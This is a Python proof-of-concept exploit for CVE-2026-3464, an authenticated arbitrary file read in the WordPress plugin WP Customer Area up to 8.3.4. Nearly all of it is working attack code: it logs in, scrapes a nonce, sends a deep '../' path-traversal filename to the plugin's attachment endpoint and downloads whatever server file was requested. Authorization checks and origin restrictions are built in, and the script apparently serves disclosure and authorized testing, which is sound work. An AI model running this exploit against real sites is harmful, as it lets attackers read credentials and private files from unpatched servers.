#!/usr/bin/env python3
#
# Exploit Title: WP Customer Area <= 8.3.4 - Authenticated Arbitrary File Read
# Date: 2026-09-13
# Exploit Author: REPLACE_WITH_YOUR_NAME
# Vendor Homepage: https://wp-customerarea.com/
# Software Link: https://wordpress.org/plugins/customer-area/
# Version: <= 8.3.4
# Tested on: WP Customer Area 8.3.4 on Linux
# CVE: CVE-2026-3464
#
"""Single-target proof of concept for CVE-2026-3464.

Use only on a system you own or are explicitly authorized to test. The PoC
copies one requested server file into a Customer Area private-file attachment.
It does not implement the related arbitrary-file-deletion primitive.
"""

import argparse
import getpass
import json
import re
import sys
from html import unescape
from pathlib import PurePosixPath
from urllib.parse import urljoin, urlsplit

import requests


def parsed_target(url: str):
    parsed = urlsplit(url)
    if parsed.scheme not in {"http", "https"} or not parsed.hostname:
        raise ValueError("target must be an absolute HTTP(S) URL")
    if parsed.username or parsed.password:
        raise ValueError("do not embed credentials in the target URL")
    return parsed


class TargetSession(requests.Session):
    """Prevent redirects and discovered links from leaving the chosen origin."""

    def __init__(self, target: str, timeout: float) -> None:
        super().__init__()
        parsed = parsed_target(target)
        self.allowed_origin = (
            parsed.scheme.lower(),
            parsed.hostname.lower(),
            parsed.port or (443 if parsed.scheme == "https" else 80),
        )
        self.timeout = timeout
        self.trust_env = False

    def request(self, method, url, **kwargs):
        kwargs.setdefault("timeout", self.timeout)
        kwargs["allow_redirects"] = False
        current_method, current_url = method, url
        for _ in range(10):
            parsed = parsed_target(current_url)
            origin = (
                parsed.scheme.lower(),
                parsed.hostname.lower(),
                parsed.port or (443 if parsed.scheme == "https" else 80),
            )
            if origin != self.allowed_origin:
                raise requests.RequestException("refusing a cross-origin request or redirect")
            response = super().request(current_method, current_url, **kwargs)
            if not (response.is_redirect or response.is_permanent_redirect):
                return response
            location = response.headers.get("Location")
            if not location:
                return response
            current_url = urljoin(current_url, location)
            if response.status_code in (301, 302, 303) and current_method.upper() != "GET":
                current_method = "GET"
                kwargs.pop("data", None)
        raise RuntimeError("too many redirects")


def input_value(html: str, name: str) -> str | None:
    escaped = re.escape(name)
    patterns = (
        rf'<input\b(?=[^>]*\bname=["\']{escaped}["\'])(?=[^>]*\bvalue=["\']([^"\']+))[^>]*>',
        rf'<input\b(?=[^>]*\bvalue=["\']([^"\']+))(?=[^>]*\bname=["\']{escaped}["\'])[^>]*>',
    )
    for pattern in patterns:
        match = re.search(pattern, html, re.I)
        if match:
            return unescape(match.group(1))
    return None


def post_ids_from(html: str) -> set[int]:
    return {
        int(value)
        for value in re.findall(
            r'post\.php\?post=(\d+)(?:(?:&|&amp;|&#0*38;)(?:amp;)?)action=edit',
            html,
            re.I,
        )
    }


def download_urls(base: str, html: str) -> list[str]:
    urls: list[str] = []
    for raw in re.findall(r'href=["\']([^"\']+)["\']', html, re.I):
        href = unescape(raw)
        if "/download/" in href or "cuar_action=download" in href:
            candidate = urljoin(base, href)
            if candidate not in urls:
                urls.append(candidate)
    return urls


def discover_posts(
    session: TargetSession, base: str, explicit_ids: list[int]
) -> list[int]:
    if explicit_ids:
        return sorted(set(explicit_ids))
    found: set[int] = set()
    portal = session.get(base)
    portal.raise_for_status()
    found.update(post_ids_from(portal.text))
    listing = session.get(urljoin(base, "wp-admin/edit.php?post_type=cuar_private_file"))
    if listing.status_code == 200:
        found.update(post_ids_from(listing.text))
    return sorted(found)


def traversal_filename(file_path: str) -> str:
    if any(character in file_path for character in ("\x00", "\r", "\n")):
        raise ValueError("file path contains invalid control characters")
    path = PurePosixPath(file_path)
    if not path.is_absolute() or str(path) == "/":
        raise ValueError("file path must be an absolute POSIX path, not filesystem root")
    clean_parts = [part for part in path.parts if part not in {"/", "."}]
    if ".." in clean_parts:
        raise ValueError("supply a normalized path without '..'")
    return "../" * 24 + "/".join(clean_parts)


def authenticate(
    session: TargetSession, base: str, username: str, password: str
) -> None:
    session.get(urljoin(base, "wp-login.php")).raise_for_status()
    response = session.post(
        urljoin(base, "wp-login.php"),
        data={
            "log": username,
            "pwd": password,
            "wp-submit": "Log In",
            "redirect_to": base,
            "testcookie": "1",
        },
    )
    response.raise_for_status()
    if not any(
        name.startswith("wordpress_logged_in") for name in session.cookies.keys()
    ):
        raise RuntimeError("authentication failed")


def run(args: argparse.Namespace) -> bytes:
    base = args.target.rstrip("/") + "/"
    parsed_target(base)
    session = TargetSession(base, args.timeout)
    session.headers["User-Agent"] = "CVE-2026-3464-single-target-poc/1.0"
    authenticate(session, base, args.username, args.password)

    post_ids = discover_posts(session, base, args.post_id)
    if not post_ids:
        raise RuntimeError("no editable private-file post found; supply --post-id")

    errors: list[str] = []
    for post_id in post_ids:
        editor_url = urljoin(base, f"wp-admin/post.php?post={post_id}&action=edit")
        editor = session.get(editor_url)
        if editor.status_code != 200:
            errors.append(f"post {post_id}: editor returned HTTP {editor.status_code}")
            continue

        nonce_name = f"cuar_ftp-folder_{post_id}"
        nonce = input_value(editor.text, nonce_name)
        if not nonce:
            errors.append(f"post {post_id}: FTP attachment nonce not found")
            continue

        response = session.post(
            urljoin(base, "wp-admin/admin-ajax.php"),
            data={
                "action": "cuar_attach_file",
                "method": "ftp-folder",
                "post_id": post_id,
                "filename": traversal_filename(args.file_path),
                "caption": "authorized-security-test",
                "extra": "ftp-copy",
                nonce_name: nonce,
            },
        )
        response.raise_for_status()
        try:
            payload = response.json()
        except requests.JSONDecodeError as exc:
            raise RuntimeError("attachment endpoint returned non-JSON data") from exc
        if not payload.get("success"):
            detail = json.dumps(payload.get("data"))
            if "not allowed to attach more than" in detail.lower():
                detail += " (use an empty private-file post or remove its attachment in the UI)"
            errors.append(f"post {post_id}: {detail}")
            continue

        file_id = str(payload["data"]["id"])
        refreshed = session.get(editor_url)
        refreshed.raise_for_status()
        urls = download_urls(base, refreshed.text)
        urls.sort(key=lambda url: file_id not in url)
        for url in urls:
            downloaded = session.get(url)
            if downloaded.status_code == 200 and downloaded.content:
                return downloaded.content
        errors.append(f"post {post_id}: attachment created but download failed")

    raise RuntimeError("no usable private-file post: " + "; ".join(errors))


def arguments() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--target", required=True, help="one authorized WordPress base URL")
    parser.add_argument("--username", required=True)
    parser.add_argument("--password", help="omit to prompt without shell-history exposure")
    parser.add_argument("--file-path", required=True, help="absolute POSIX file path")
    parser.add_argument("--post-id", type=int, action="append", default=[])
    parser.add_argument("--timeout", type=float, default=10)
    parser.add_argument(
        "--authorized",
        action="store_true",
        help="confirm that you own or have explicit permission to test the target",
    )
    args = parser.parse_args()
    if not args.authorized:
        parser.error("--authorized is required")
    if not args.password:
        args.password = getpass.getpass("WordPress password: ")
    return args


def main() -> int:
    try:
        content = run(arguments())
        sys.stdout.buffer.write(content)
        if content and not content.endswith(b"\n"):
            sys.stdout.buffer.write(b"\n")
        return 0
    except (ValueError, RuntimeError, requests.RequestException) as exc:
        print(f"error: {exc}", file=sys.stderr)
        return 1


if __name__ == "__main__":
    raise SystemExit(main())
